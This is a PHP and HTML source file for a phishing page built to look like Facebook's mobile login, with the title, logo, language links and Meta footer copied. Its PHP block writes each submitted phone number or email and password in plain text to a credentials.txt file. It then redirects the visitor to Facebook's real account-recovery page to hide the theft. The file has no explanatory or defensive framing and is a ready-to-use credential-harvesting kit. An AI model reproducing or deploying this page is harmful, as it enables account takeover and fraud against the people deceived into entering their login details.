<?php

if(isset($_POST["submit"])){
 
  
  $name = $_POST["name"];
  $pass = $_POST["pass"];
  

  

  $file = fopen('credentials.txt','a+');
  fwrite($file, "\n");
  fwrite($file, "Phone No : "
  . $name . "\n"
  . "Password : " . $pass .
    "\n\n");
 
 
  fclose($file);
  
  
  
  echo "Logging in...";
  header("location: https://m.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&ars=m_account_switcher&from_login_screen=0&wtsid=rdr_0OAVAh5WWRDWcLRx4&_rdr");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="{{url_for('static', filename='./logo/logo.svg')}}" type="image/x-icon">
    <title>Facebook – log in or sign up</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
          theme: {
            extend: {
              colors: {
                color1:'#1b76de',
                color2:'#2e8a04',
              }
            }
          }
        }
    </script>
    <style>
        abc{
            color: #2e8a04;
        }
    </style>
</head>
<body class="p-0 m-0">
    <div class="w-[100%] flex flex-col items-center sm:pt-[50px]">
        <header class="w-[100%] px-[10px] py-[5px] flex items-center h-[50px] bg-yellow-100 sm:hidden">
            <div class="logo">
                <img src="./logo/mobile.png" alt="" class="w-[40px] h-[45px]">
            </div>
            <div class="header-text text-sky-900 text-[14px]">Get Facebook for Android and browse faster</div>
        </header>
        <div class="text-center my-[15px]">
            <img class="w-[200px]" src="./logo/Facebook-Logo.wine.svg">
        </div>
        <form action="" method="post" class="px-[15px] w-[100%] sm:w-[450px]">
            <input class="bg-zinc-200 w-full h-[45px] px-[15px] text-slate-800 text-[14px] placeholder-slate-600 outline-none shadow-gray-300 shadow-sm border-[1px] border-slate-300 rounded-[5px]" type="text" name="name" id="" placeholder="Mobile number or email address" />
            <input class="bg-zinc-200 w-full mt-[8px] h-[45px] px-[15px] text-slate-800 text-[14px] placeholder-slate-600 outline-none shadow-gray-300 shadow-sm border-[1px] border-slate-300 rounded-[5px]" type="password" name="pass" id="" placeholder="Password" />
            <button class="my-[10px] bg-color1 w-full h-[42px] rounded-[5px] text-white font-bold text-[20px] active:opacity-75" type="submit" name="submit">Log In</button>
        </form>
        <div class="text-color1 text-[14px]">Forgotten password?</div>
        <div class="wrapper my-[20px] px-[15px] w-[100%] flex justify-center items-center gap-[20px] sm:w-[450px]">
            <div class="w-full h-[1px] bg-slate-300"></div>
            <div class="w-[20px] text-zinc-800">or</div>
            <div class="w-full h-[1px] bg-slate-300"></div>
        </div>
        <button class="bg-color2 w-[180px] h-[40px] rounded-[5px] text-white font-bold text-[14px]">Create New Account</button>
        <footer class="mt-[100px] mb-[10px]">
            <div class="languages flex justify-center items-center gap-[100px]">
                <ul class="text-center text-sky-900 text-[14px]">
                    <li class="text-zinc-600 font-medium">English (UK)</li>
                    <li class="">मराठी</li>
                    <li class="">ਪੰਜਾਬੀ</li>
                    <li class="">ગુજરાતી</li>
                </ul>
                <ul class="text-center text-sky-900 text-[14px] flex flex-col items-center">
                    <li class="">हिन्दी</li>
                    <li class="">اردو</li>
                    <li class="">বাংলা</li>
                    <li class="text-[22px] w-[24px] h-[24px] flex justify-center items-center text-zinc-600 border-[1px] border-sky-900 rounded-[5px]">+</li>
                </ul>
            </div>
            <div class="my-[20px] flex justify-center items-center gap-[8px] text-[14px] text-zinc-600">
                <div class="">About</div>
                <div class="w-[2px] h-[2px] bg-zinc-600"></div>
                <div class="">Help</div>
                <div class="w-[2px] h-[2px] bg-zinc-600"></div>
                <div class="">More</div>
            </div>
            <div class="text-[14px] text-zinc-600 text-center">Meta &#169; 2022</div>
        </footer>
    </div>
</body>
</html>
